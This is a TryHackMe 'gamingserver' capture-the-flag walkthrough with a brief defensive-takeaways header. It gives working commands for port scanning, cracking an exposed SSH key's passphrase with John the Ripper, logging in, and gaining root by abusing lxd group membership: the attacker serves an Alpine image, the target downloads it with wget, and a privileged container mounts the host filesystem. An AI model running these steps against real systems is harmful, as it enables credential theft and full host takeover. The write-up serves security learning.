# gamingserver

<!-- brain:report -->
- **Platform** TryHackMe
- **Difficulty** Easy
- **Source status** Documented

## Report overview

The observations in this case inform a review of Unix host privilege boundaries and credential exposure prevention.

## Defensive takeaways

- Review the execution identity and writable paths of elevated host services, jobs and binaries.
- Review configuration, logs and backups for unintended access to credentials. Rotate any credentials confirmed to be exposed.

## Defensive references

- [Unix host privilege review](../../../defense/techniques/host-privilege-review.md)
- [Credential exposure prevention](../../../defense/techniques/secret-handling.md)

<!-- /brain:report -->

---


## Reconnaissance
```bash
nmap -sS -n -p- -Pn --min-rate 4000 $TARGET -oA silent
nmap -sVC -p22,80 $TARGET -oN service
```

**Output**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```


---

## Web Fuzzing
```bash
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

**Output**
```bash
200      GET       77l      316w     2762c http://10.129.136.65/index.html
200      GET      768l     3870w   295060c http://10.129.136.65/featured-character.jpg
200      GET       62l      379w     3067c http://10.129.136.65/myths.html
200      GET      676l     1423w    14223c http://10.129.136.65/style.css
200      GET       66l      119w     1435c http://10.129.136.65/about.html
200      GET      222l     1251w    87416c http://10.129.136.65/logo.png
200      GET       77l      316w     2762c http://10.129.136.65/
200      GET        3l        5w       33c http://10.129.136.65/robots.txt
301      GET        9l       28w      315c http://10.129.136.65/secret => http://10.129.136.65/secret/
200      GET       30l       37w     1766c http://10.129.136.65/secret/secretKey
301      GET        9l       28w      316c http://10.129.136.65/uploads => http://10.129.136.65/uploads/
200      GET      222l      221w     2006c http://10.129.136.65/uploads/dict.lst
200      GET       63l      544w     3070c http://10.129.136.65/uploads/manifesto.t
```

---

## Explotation
### there is a variout interesting files like http://10.129.136.65/uploads/dict.lst and http://10.129.136.65/secret/secretKey
### one of them appears to be an worlist we can use to enum users or password and another a private key to connect to the ssh server
```bash
/usr/share/john/ssh2john.py private-id-rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

**Output**
```bash
private-id-rsa:letmein
```

### in the index.htm we can see a user jhon 
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

```bash
ssh -i private-id-rsa john@$TARGET
```

## Priviesc
```bash
# Search for suid
find / -perm -4000 -type f 2>/dev/null 
# Capabilities
getcap -r / 2>/dev/null
```

## We are par of the group lxd we can build an a alpine image and upload it to the target and get root 
```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 80
# In the target 
wget http://ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
# Add the image
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc init cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# Grab the flag
cat /mnt/root/root/root.txt
```
